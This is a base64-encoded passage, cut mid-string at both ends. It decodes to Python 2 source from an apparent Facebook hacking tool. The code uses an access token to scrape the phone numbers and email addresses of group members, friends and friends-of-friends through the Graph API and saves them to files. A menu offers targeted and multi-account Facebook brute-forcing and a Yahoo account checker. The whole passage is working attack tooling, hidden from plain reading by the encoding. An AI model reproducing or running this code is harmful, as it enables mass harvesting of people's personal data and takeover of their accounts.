JCW1ha2VfYWN0aW9uID0gb3Blbignb3V0L25vX21lbWJlcl9ncm91cC50eHQnLCd3JykKCQlyZT1yZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycraWQrJy9tZW1iZXJzP2ZpZWxkcz1uYW1lLGlkJmxpbWl0PTk5OTk5OTk5OSZhY2Nlc3NfdG9rZW49JytmYl90b2tlbikKCQlzPWpzb24ubG9hZHMocmUudGV4dCkKCQlmb3IgYSBpbiBzWydkYXRhJ106CgkJCXggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIrYVsnaWQnXSsiP2FjY2Vzc190b2tlbj0iK2ZiX3Rva2VuKQoJCQl6ID0ganNvbi5sb2Fkcyh4LnRleHQpCgkJCXRyeToKCQkJCW51bWJlci5hcHBlbmQoelsnbW9iaWxlX3Bob25lJ10pCgkJCQltYWtlX2FjdGlvbi53cml0ZSh6Wydtb2JpbGVfcGhvbmUnXSArICdcbicpCgkJCQlwcmludCAoIlxyXDAzM1sxOzk3bVsgXDAzM1sxOzkybSIrc3RyKGxlbihudW1iZXIpKSsiXDAzM1sxOzk3bSBdXDAzM1sxOzk3bT0+IFwwMzNbMTs5N20iK3pbJ21vYmlsZV9waG9uZSddKyIgfCAiK3pbJ25hbWUnXSsiXG4iKSw7c3lzLnN0ZG91dC5mbHVzaCgpO3RpbWUuc2xlZXAoMC4wMDAxKQoJCQlleGNlcHQgS2V5RXJyb3I6CgkJCQlwYXNzCgkJbWFrZV9hY3Rpb24uY2xvc2UoKQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJCXByaW50ICdcclwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1TdWNjZXNzZnVsbHkgZ2V0IHBob25lIG51bWJlciBmcm9tIG1lbWJlciBncm91cCBcMDMzWzE7OTdtLi4uLicKCQlwcmludCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVRvdGFsIE51bWJlciBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtJXMiJShsZW4obnVtYmVyKSkKCQlkb25lID0gcmF3X2lucHV0KCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVNhdmUgZmlsZSB3aXRoIG5hbWVcMDMzWzE7OTFtIDpcMDMzWzE7OTdtICIpCgkJb3MucmVuYW1lKCdvdXQvbm9fbWVtYmVyX2dyb3VwLnR4dCcsJ291dC8nK2RvbmUpCgkJcHJpbnQoIlxyXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRmlsZSBzYXZlZCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtb3V0LyIrZG9uZSkKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCWR1bXAoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBFcnJvciBjcmVhdGluZyBmaWxlIgoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZHVtcCgpCglleGNlcHQgKEtleWJvYXJkSW50ZXJydXB0LEVPRkVycm9yKToKCQlwcmludCgiXDAzM1sxOzkxbVshXSBTdG9wcGVkIikKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCWR1bXAoKQoJZXhjZXB0IEtleUVycm9yOgoJCXByaW50KCdcMDMzWzE7OTFtWyFdIEVycm9yJykKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCWR1bXAoKQoJZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgoJCXByaW50IlwwMzNbMTs5MW1b4pyWXSBObyBjb25uZWN0aW9uIgoJCWV4aXQoKQoKIyMjIyMgRU1BSUwgIyMjIyMKZGVmIGVtYWlsKCk6Cgl0cnk6CgkJZmJfdG9rZW49b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDAuMDEpCgkJbG9naW4oKQoJdHJ5OgoJCW9zLm1rZGlyKCdvdXQnKQoJZXhjZXB0IE9TRXJyb3I6CgkJcGFzcwoJdHJ5OgoJCW9zLnN5c3RlbSgnY2xlYXInKQoJCXByaW50IGxvZ28KCQlyID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS9mcmllbmRzP2FjY2Vzc190b2tlbj0nK2ZiX3Rva2VuKQoJCWEgPSBqc29uLmxvYWRzKHIudGV4dCkKCQlta2RpcignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1HZXQgYWxsIGZyaWVuZCBlbWFpbCBcMDMzWzE7OTdtLi4uJykKCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCQltYWtlX2FjdGlvbiA9IG9wZW4oJ291dC9lbWFpbF9mcmllbmRzLnR4dCcsJ3cnKQoJCWZvciBpIGluIGFbJ2RhdGEnXToKCQkJeCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIitpWydpZCddKyI/YWNjZXNzX3Rva2VuPSIrZmJfdG9rZW4pCgkJCXogPSBqc29uLmxvYWRzKHgudGV4dCkKCQkJdHJ5OgoJCQkJZW0uYXBwZW5kKHpbJ2VtYWlsJ10pCgkJCQltYWtlX2FjdGlvbi53cml0ZSh6WydlbWFpbCddICsgJ1xuJykKCQkJCXByaW50ICgiXHJcMDMzWzE7OTdtWyBcMDMzWzE7OTJtIitzdHIobGVuKGVtKSkrIlwwMzNbMTs5N20gXVwwMzNbMTs5N209PiBcMDMzWzE7OTdtIit6WydlbWFpbCddKyIgfCAiK3pbJ25hbWUnXSsiXG4iKSw7c3lzLnN0ZG91dC5mbHVzaCgpO3RpbWUuc2xlZXAoMC4wMDAxKQoJCQlleGNlcHQgS2V5RXJyb3I6CgkJCQlwYXNzCgkJbWFrZV9hY3Rpb24uY2xvc2UoKQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJCXByaW50ICdcclwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1TdWNjZXNzZnVsbHkgZ2V0IGVtYWlsIFwwMzNbMTs5N20uLi4uJwoJCXByaW50IlxyXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtVG90YWwgRW1haWwgXDAzM1sxOzkxbTogXDAzM1sxOzk3bSVzIiUobGVuKGVtKSkKCQlkb25lID0gcmF3X2lucHV0KCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVNhdmUgZmlsZSB3aXRoIG5hbWVcMDMzWzE7OTFtIDpcMDMzWzE7OTdtICIpCgkJb3MucmVuYW1lKCdvdXQvZW1haWxfZnJpZW5kcy50eHQnLCdvdXQvJytkb25lKQoJCXByaW50KCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZpbGUgc2F2ZWQgXDAzM1sxOzkxbTogXDAzM1sxOzk3bW91dC8iK2RvbmUpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlkdW1wKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gRXJyb3IgY3JlYXRpbmcgZmlsZSIKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCWR1bXAoKQoJZXhjZXB0IChLZXlib2FyZEludGVycnVwdCxFT0ZFcnJvcik6CgkJcHJpbnQoIlwwMzNbMTs5MW1bIV0gU3RvcHBlZCIpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlkdW1wKCkKCWV4Y2VwdCBLZXlFcnJvcjoKCQlwcmludCgnXDAzM1sxOzkxbVshXSBFcnJvcicpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlkdW1wKCkKCWV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtW+Kcll0gTm8gY29ubmVjdGlvbiIKCQlleGl0KCkKCiMjIyMjIEVNQUlMIEZST00gRlJJRU5EUyAjIyMjIwpkZWYgZW1haWxfZnJvbV9mcmllbmRzKCk6Cglvcy5zeXN0ZW0oJ2NsZWFyJykKCXRyeToKCQlmYl90b2tlbj1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xlZXAoMC4wMSkKCQlsb2dpbigpCgl0cnk6CgkJb3MubWtkaXIoJ291dCcpCglleGNlcHQgT1NFcnJvcjoKCQlwYXNzCgl0cnk6CgkJb3Muc3lzdGVtKCdjbGVhcicpCgkJcHJpbnQgbG9nbwoJCWlkdCA9IHJhd19pbnB1dCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtSW5wdXQgSUQgZnJpZW5kIFwwMzNbMTs5MW06IFwwMzNbMTs5N20iKQoJCXRyeToKCQkJc2VhdCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIitpZHQrIj9hY2Nlc3NfdG9rZW49IitmYl90b2tlbikKCQkJb3AgPSBqc29uLmxvYWRzKHNlYXQudGV4dCkKCQkJcHJpbnQiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybUZyb21cMDMzWzE7OTFtIDpcMDMzWzE7OTdtICIrb3BbIm5hbWUiXQoJCWV4Y2VwdCBLZXlFcnJvcjoKCQkJcHJpbnQiXDAzM1sxOzkxbVshXSBGcmllbmQgbm90IGZvdW5kIgoJCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCQlkdW1wKCkKCQlyID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8nK2lkdCsnL2ZyaWVuZHM/YWNjZXNzX3Rva2VuPScrZmJfdG9rZW4pCgkJYSA9IGpzb24ubG9hZHMoci50ZXh0KQoJCW1rZGlyKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybUdldCBhbGwgZnJpZW5kIGVtYWlsIGZyb20gZnJpZW5kIFwwMzNbMTs5N20uLi4nKQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJCW1ha2VfYWN0aW9uID0gb3Blbignb3V0L2VtX2ZyaWVuZHNfZnJvbV9mcmllbmRzLnR4dCcsJ3cnKQoJCWZvciBpIGluIGFbJ2RhdGEnXToKCQkJeCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIitpWydpZCddKyI/YWNjZXNzX3Rva2VuPSIrZmJfdG9rZW4pCgkJCXogPSBqc29uLmxvYWRzKHgudGV4dCkKCQkJdHJ5OgoJCQkJZW1haWxfZnJvbV9mcmllbmRzLmFwcGVuZCh6WydlbWFpbCddKQoJCQkJbWFrZV9hY3Rpb24ud3JpdGUoelsnZW1haWwnXSArICdcbicpCgkJCQlwcmludCAoIlxyXDAzM1sxOzk3bVsgXDAzM1sxOzkybSIrc3RyKGxlbihlbWFpbF9mcm9tX2ZyaWVuZHMpKSsiXDAzM1sxOzk3bSBdXDAzM1sxOzk3bT0+IFwwMzNbMTs5N20iK3pbJ2VtYWlsJ10rIiB8ICIrelsnbmFtZSddKyJcbiIpLDtzeXMuc3Rkb3V0LmZsdXNoKCk7dGltZS5zbGVlcCgwLjAwMDEpCgkJCWV4Y2VwdCBLZXlFcnJvcjoKCQkJCXBhc3MKCQltYWtlX2FjdGlvbi5jbG9zZSgpCgkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCgkJcHJpbnQgJ1xyXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybVN1Y2Nlc3NmdWxseSBnZXQgZW1haWwgXDAzM1sxOzk3bS4uLi4nCgkJcHJpbnQiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Ub3RhbCBFbWFpbCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtJXMiJShsZW4oZW1haWxfZnJvbV9mcmllbmRzKSkKCQlkb25lID0gcmF3X2lucHV0KCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVNhdmUgZmlsZSB3aXRoIG5hbWVcMDMzWzE7OTFtIDpcMDMzWzE7OTdtICIpCgkJb3MucmVuYW1lKCdvdXQvZW1fZnJpZW5kc19mcm9tX2ZyaWVuZHMudHh0Jywnb3V0LycrZG9uZSkKCQlwcmludCgiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1GaWxlIHNhdmVkIFwwMzNbMTs5MW06IFwwMzNbMTs5N21vdXQvIitkb25lKQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZHVtcCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIEVycm9yIGNyZWF0aW5nIGZpbGUiCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlkdW1wKCkKCWV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQsRU9GRXJyb3IpOgoJCXByaW50KCJcMDMzWzE7OTFtWyFdIFN0b3BwZWQiKQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZHVtcCgpCglleGNlcHQgS2V5RXJyb3I6CgkJcHJpbnQoJ1wwMzNbMTs5MW1bIV0gRXJyb3InKQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZHVtcCgpCglleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVvinJZdIE5vIGNvbm5lY3Rpb24iCgkJZXhpdCgpCgojIyMjIyBQSE9ORSBOVU1CRVIgIyMjIyMKZGVmIHBob25lX251bWJlcigpOgoJb3Muc3lzdGVtKCdjbGVhcicpCgl0cnk6CgkJZmJfdG9rZW49b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDAuMDEpCgkJbG9naW4oKQoJdHJ5OgoJCW9zLm1rZGlyKCdvdXQnKQoJZXhjZXB0IE9TRXJyb3I6CgkJcGFzcwoJdHJ5OgoJCW9zLnN5c3RlbSgnY2xlYXInKQoJCXByaW50IGxvZ28KCQlta2RpcignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1HZXQgYWxsIGZyaWVuZCBudW1iZXIgcGhvbmUgXDAzM1sxOzk3bS4uLicpCgkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCgkJdXJsPSAiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWUvZnJpZW5kcz9hY2Nlc3NfdG9rZW49IitmYl90b2tlbgoJCXIgPXJlcXVlc3RzLmdldCh1cmwpCgkJej1qc29uLmxvYWRzKHIudGV4dCkKCQltYWtlX2FjdGlvbiA9IG9wZW4oJ291dC9ub21lcl9mcmllbmRzLnR4dCcsJ3cnKQoJCWZvciBuIGluIHpbImRhdGEiXToKCQkJeCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIituWydpZCddKyI/YWNjZXNzX3Rva2VuPSIrZmJfdG9rZW4pCgkJCXogPSBqc29uLmxvYWRzKHgudGV4dCkKCQkJdHJ5OgoJCQkJaHAuYXBwZW5kKHpbJ21vYmlsZV9waG9uZSddKQoJCQkJbWFrZV9hY3Rpb24ud3JpdGUoelsnbW9iaWxlX3Bob25lJ10gKyAnXG4nKQoJCQkJcHJpbnQgKCJcclwwMzNbMTs5N21bIFwwMzNbMTs5Mm0iK3N0cihsZW4oaHApKSsiXDAzM1sxOzk3bSBdXDAzM1sxOzk3bT0+IFwwMzNbMTs5N20iK3pbJ21vYmlsZV9waG9uZSddKyIgfCAiK3pbJ25hbWUnXSsiXG4iKSw7c3lzLnN0ZG91dC5mbHVzaCgpO3RpbWUuc2xlZXAoMC4wMDAxKQoJCQlleGNlcHQgS2V5RXJyb3I6CgkJCQlwYXNzCgkJbWFrZV9hY3Rpb24uY2xvc2UoKQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJCXByaW50ICdcclwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1TdWNjZXNzZnVsbHkgZ2V0IG51bWJlciBcMDMzWzE7OTdtLi4uLicKCQlwcmludCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVRvdGFsIE51bWJlciBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtJXMiJShsZW4oaHApKQoJCWRvbmUgPSByYXdfaW5wdXQoIlxyXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtU2F2ZSBmaWxlIHdpdGggbmFtZVwwMzNbMTs5MW0gOlwwMzNbMTs5N20gIikKCQlvcy5yZW5hbWUoJ291dC9ub21lcl9mcmllbmRzLnR4dCcsJ291dC8nK2RvbmUpCgkJcHJpbnQoIlxyXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRmlsZSBzYXZlZCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtb3V0LyIrZG9uZSkKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCWR1bXAoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBFcnJvciBjcmVhdGluZyBmaWxlIgoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZHVtcCgpCglleGNlcHQgKEtleWJvYXJkSW50ZXJydXB0LEVPRkVycm9yKToKCQlwcmludCgiXDAzM1sxOzkxbVshXSBTdG9wcGVkIikKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCWR1bXAoKQoJZXhjZXB0IEtleUVycm9yOgoJCXByaW50KCdcMDMzWzE7OTFtWyFdIEVycm9yJykKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCWR1bXAoKQoJZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgoJCXByaW50IlwwMzNbMTs5MW1b4pyWXSBObyBjb25uZWN0aW9uIgoJCWV4aXQoKQoKIyMjIyMgUEhPTkUgTlVNQkVSIEZST00gRlJJRU5EUyAjIyMjIwpkZWYgcGhvbmVfbnVtYmVyX2Zyb21fZnJpZW5kcygpOgoJb3Muc3lzdGVtKCdjbGVhcicpCgl0cnk6CgkJZmJfdG9rZW49b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDAuMDEpCgkJbG9naW4oKQoJdHJ5OgoJCW9zLm1rZGlyKCdvdXQnKQoJZXhjZXB0IE9TRXJyb3I6CgkJcGFzcwoJdHJ5OgoJCW9zLnN5c3RlbSgnY2xlYXInKQoJCXByaW50IGxvZ28KCQlpZHQgPSByYXdfaW5wdXQoIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUlucHV0IElEIGZyaWVuZCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtIikKCQl0cnk6CgkJCXNlYXQgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIraWR0KyI/YWNjZXNzX3Rva2VuPSIrZmJfdG9rZW4pCgkJCW9wID0ganNvbi5sb2FkcyhzZWF0LnRleHQpCgkJCXByaW50IlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1Gcm9tXDAzM1sxOzkxbSA6XDAzM1sxOzk3bSAiK29wWyJuYW1lIl0KCQlleGNlcHQgS2V5RXJyb3I6CgkJCXByaW50IlwwMzNbMTs5MW1bIV0gRnJpZW5kIG5vdCBmb3VuZCIKCQkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQkJZHVtcCgpCgkJciA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJytpZHQrJy9mcmllbmRzP2FjY2Vzc190b2tlbj0nK2ZiX3Rva2VuKQoJCWEgPSBqc29uLmxvYWRzKHIudGV4dCkKCQlta2RpcignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1HZXQgYWxsIGZyaWVuZCBudW1iZXIgZnJvbSBmcmllbmQgXDAzM1sxOzk3bS4uLicpCgkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCgkJbWFrZV9hY3Rpb24gPSBvcGVuKCdvdXQvbm9fZnJpZW5kc19mcm9tX2ZyaWVuZHMudHh0JywndycpCgkJZm9yIGkgaW4gYVsnZGF0YSddOgoJCQl4ID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lbJ2lkJ10rIj9hY2Nlc3NfdG9rZW49IitmYl90b2tlbikKCQkJeiA9IGpzb24ubG9hZHMoeC50ZXh0KQoJCQl0cnk6CgkJCQlocGZyb21mcmllbmRzLmFwcGVuZCh6Wydtb2JpbGVfcGhvbmUnXSkKCQkJCW1ha2VfYWN0aW9uLndyaXRlKHpbJ21vYmlsZV9waG9uZSddICsgJ1xuJykKCQkJCXByaW50ICgiXHJcMDMzWzE7OTdtWyBcMDMzWzE7OTJtIitzdHIobGVuKGhwZnJvbWZyaWVuZHMpKSsiXDAzM1sxOzk3bSBdXDAzM1sxOzk3bT0+IFwwMzNbMTs5N20iK3pbJ21vYmlsZV9waG9uZSddKyIgfCAiK3pbJ25hbWUnXSsiXG4iKSw7c3lzLnN0ZG91dC5mbHVzaCgpO3RpbWUuc2xlZXAoMC4wMDAxKQoJCQlleGNlcHQgS2V5RXJyb3I6CgkJCQlwYXNzCgkJbWFrZV9hY3Rpb24uY2xvc2UoKQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJCXByaW50ICdcclwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5Mm1TdWNjZXNzZnVsbHkgZ2V0IG51bWJlciBcMDMzWzE7OTdtLi4uLicKCQlwcmludCJcclwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVRvdGFsIE51bWJlciBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtJXMiJShsZW4oaHBmcm9tZnJpZW5kcykpCgkJZG9uZSA9IHJhd19pbnB1dCgiXHJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1TYXZlIGZpbGUgd2l0aCBuYW1lXDAzM1sxOzkxbSA6XDAzM1sxOzk3bSAiKQoJCW9zLnJlbmFtZSgnb3V0L25vX2ZyaWVuZHNfZnJvbV9mcmllbmRzLnR4dCcsJ291dC8nK2RvbmUpCgkJcHJpbnQoIlxyXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRmlsZSBzYXZlZCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtb3V0LyIrZG9uZSkKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCWR1bXAoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBFcnJvciBjcmVhdGluZyBmaWxlIgoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJZHVtcCgpCglleGNlcHQgKEtleWJvYXJkSW50ZXJydXB0LEVPRkVycm9yKToKCQlwcmludCgiXDAzM1sxOzkxbVshXSBTdG9wcGVkIikKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCWR1bXAoKQoJZXhjZXB0IEtleUVycm9yOgoJCXByaW50KCdcMDMzWzE7OTFtWyFdIEVycm9yJykKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCWR1bXAoKQoJZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgoJCXByaW50IlwwMzNbMTs5MW1b4pyWXSBObyBjb25uZWN0aW9uIgoJCWV4aXQoKQoKIyMjIyMgTUVOVSBIQUNLICMjIyMjCmRlZiBtZW51X2hhY2soKToKCW9zLnN5c3RlbSgnY2xlYXInKQoJdHJ5OgoJCWZiX3Rva2VuPW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCgwLjAxKQoJCWxvZ2luKCkKCW9zLnN5c3RlbSgnY2xlYXInKQoJcHJpbnQgbG9nbwoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0xLlwwMzNbMTs5N20gTWluaSBIYWNrIEZhY2Vib29rKFwwMzNbMTs5Mm1UYXJnZXRcMDMzWzE7OTdtKSIKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMi5cMDMzWzE7OTdtIE11bHRpIEJydXRlZm9yY2UgRmFjZWJvb2siCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTMuXDAzM1sxOzk3bSBTdXBlciBNdWx0aSBCcnV0ZWZvcmNlIEZhY2Vib29rIgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm00LlwwMzNbMTs5N20gQnJ1dGVGb3JjZShcMDMzWzE7OTJtVGFyZ2V0XDAzM1sxOzk3bSkiCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTUuXDAzM1sxOzk3bSBZYWhvbyBDaGVja2VyIgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5MW0wLlwwMzNbMTs5N20gQmFjayIKCXByaW50ICLilZEiCgljaG9vc2VfaGFjaygpCiMtLS0tY2hvaWNlcwpkZWYgY2hvb3NlX2hhY2soKToKCWhhY2sgPSByYXdfaW5wdXQoIlwwMzNbMTs5N23ilZrilZBcMDMzWzE7OTFtPj4+IFwwMzNbMTs5N20iKQoJaWYgaGFjaz09IiI6CgkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gV3JvbmcgaW5wdXQiCgkJY2hvb3NlX2hhY2soKQoJZWxpZiBoYWNrID09IjEiOgoJCW1pbmkoKQoJZWxpZiBoYWNrID09IjIiOgoJCWNyYWNrKCkKCQlzdWNjZXNzKCkKCWVsaWYgaGFjayA9PSIzIjoKCQlzdXBlcigpCgllbGlmIGhhY2sgPT0iNCI6CgkJYnJ1dGUoKQoJZWxpZiBoYWNrID09IjUiOgoJCW1lbnVfeWFob28oKQoJZWxpZiBoYWNrID09IjAiOgoJCW1lbnUoKQoJZWxzZToKCQlwcmludCAiXDAzM1sxOzkxbVshXSBXcm9uZyBpbnB1dCIKCQljaG9vc2VfaGFjaygpCgojIyMjIy